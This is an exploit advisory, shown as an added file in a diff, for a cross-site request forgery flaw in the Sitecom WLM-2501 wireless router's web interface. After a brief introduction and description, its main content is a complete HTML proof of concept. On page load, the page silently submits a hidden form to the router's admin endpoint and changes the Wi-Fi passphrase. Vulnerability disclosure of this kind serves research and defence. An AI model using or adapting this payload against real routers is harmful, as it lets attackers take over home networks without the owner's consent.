@@ -1,0 +1,42 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : Sitecom WLM-2501 Change Wireless Passphrase
+# Date             : 13-03-2012
+# Author           : Ivano Binetti (http://www.ivanobinetti.com)
+# Vendor site      : http://www.sitecom.com/wireless-modem-router-300n/p/859
+# Version          : WLM-2501
+# Tested on        : WLM-2501 (All Sitecom WL series might be is affected by these vulnerabilities)
+# Original Advisory: http://ivanobinetti.blogspot.com/2012/03/sitecom-wlm-2501-change-wireless.html
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+
++--------------------------------------------------------------------------------------------------------------------------------+
+
+1)Introduction 
+Sitecom WLM-2501 is a Wireless Modem Router 300N which uses a web management interface - listening to default on tcp/ip port 80
+- and "admin" as default administrator. His default ip address is 192.168.0.1.
+
+
+2)Vulnerability Description
+The web interface of this router is affected by muktiple CSRF vulnerabilities which allows to change router parameters and 
+- among other things - to change Wireless Passphrase.
+
+3)Exploit 
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to change Wireless Passphrase</H2>
+<form method="POST" name="form0" action="http://192.168.0.1:80/goform/admin/formWlEncrypt">
+<input type="hidden" name="wlanDisabled" value="OFF"/>
+<input type="hidden" name="method" value="6"/>
+<input type="hidden" name="wpaAuth" value="psk"/>
+<input type="hidden" name="pskFormat" value="0"/>
+<input type="hidden" name="pskValue" value="newpassword"/>
+<input type="hidden" name="submit-url" value="%2Fwlwpa.asp"/>
+<input type="hidden" name="save" value="Apply"/>
+</form>
+</body>
+</html>
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
